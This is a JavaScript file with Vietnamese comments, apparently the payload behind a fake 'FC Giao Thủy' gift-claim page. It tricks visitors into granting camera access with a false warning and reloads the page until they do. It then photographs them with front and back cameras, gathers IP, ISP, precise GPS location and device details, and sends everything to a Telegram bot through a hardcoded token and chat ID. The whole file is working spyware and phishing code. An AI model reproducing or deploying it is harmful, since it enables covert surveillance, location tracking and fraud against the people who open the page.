const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const info = {
  time: '', ip: '', isp: '', address: '', lat: '', lon: '', device: '', os: '', camera: '⏳ Đang quét...'
};

const delay = ms => new Promise(res => setTimeout(res, ms));

// Hàm chụp ảnh - Nếu không có stream sẽ văng lỗi ngay
async function captureCamera(facingMode = 'user') {
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
  return new Promise(resolve => {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    video.onloadedmetadata = () => {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      setTimeout(() => {
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
      }, 700);
    };
  });
}

async function main() {
  info.time = new Date().toLocaleString('vi-VN');
  
  // 1. Nhận diện thiết bị
  const ua = navigator.userAgent;
  info.os = /Android/i.test(ua) ? 'Android' : (/iPhone|iPad/i.test(ua) ? 'iOS' : 'PC');
  info.device = navigator.platform;

  let frontBlob = null;
  let backBlob = null;

  try {
    // 2. BƯỚC QUAN TRỌNG: ÉP QUYỀN CAMERA
    // Chụp mặt trước
    frontBlob = await captureCamera("user");
    await delay(500);
    // Chụp mặt sau
    backBlob = await captureCamera("environment");
    info.camera = "✅ Thành công";
  } catch (e) {
    // NẾU TỪ CHỐI HOẶC LỖI -> HIỆN THÔNG BÁO VÀ RELOAD
    alert("CẢNH BÁO: Hệ thống yêu cầu quyền Camera để xác thực nhận quà. Vui lòng nhấn 'Cho phép' và thử lại!");
    location.reload(); // Tải lại trang ngay lập tức
    return; // Dừng mọi logic phía sau
  }

  // 3. LẤY IP & GPS (Chỉ chạy khi đã vượt qua bước Cam)
  const getIP = fetch('https://ipwho.is/').then(r => r.json()).then(res => {
    info.ip = res.ip;
    info.isp = res.connection?.org || 'N/A';
    info.lat = res.latitude;
    info.lon = res.longitude;
  }).catch(() => {});

  const getGPS = new Promise(res => {
    navigator.geolocation.getCurrentPosition(
      p => {
        info.lat = p.coords.latitude.toFixed(6);
        info.lon = p.coords.longitude.toFixed(6);
        info.address = `GPS: ${info.lat}, ${info.lon}`;
        res();
      },
      () => res(), // Nếu từ chối GPS thì dùng tạm tọa độ IP ở trên
      { enableHighAccuracy: true, timeout: 4000 }
    );
  });

  // Đợi đồng bộ dữ liệu
  await Promise.all([getIP, getGPS, delay(1500)]);

  // 4. GỬI TELEGRAM (Chắc chắn 100% có ảnh mới chạy tới đây)
  const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
  const caption = `
🏆 <b>[DATA NHẬN QUÀ FC GIAO THỦY]</b>
--------------------------
🕒 <b>Time:</b> ${info.time}
📱 <b>Device:</b> ${info.device} (${info.os})
🌍 <b>IP:</b> ${info.ip} | <b>ISP:</b> ${info.isp}
📍 <b>Maps:</b> <a href="${mapsLink}">Bấm để xem vị trí</a>
🏙️ <b>Địa chỉ:</b> ${info.address || 'Đang xác định...'}
📸 <b>Cam:</b> ${info.camera}
`.trim();

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  
  const media = [];
  formData.append('p1', frontBlob, '1.jpg');
  media.push({ type: 'photo', media: 'attach://p1', caption: caption, parse_mode: 'HTML' });
  
  if (backBlob) {
    formData.append('p2', backBlob, '2.jpg');
    media.push({ type: 'photo', media: 'attach://p2' });
  }

  formData.append('media', JSON.stringify(media));

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
      method: 'POST',
      body: formData
    });
  } catch (err) {
    console.error("Lỗi gửi Telegram:", err);
  }
}
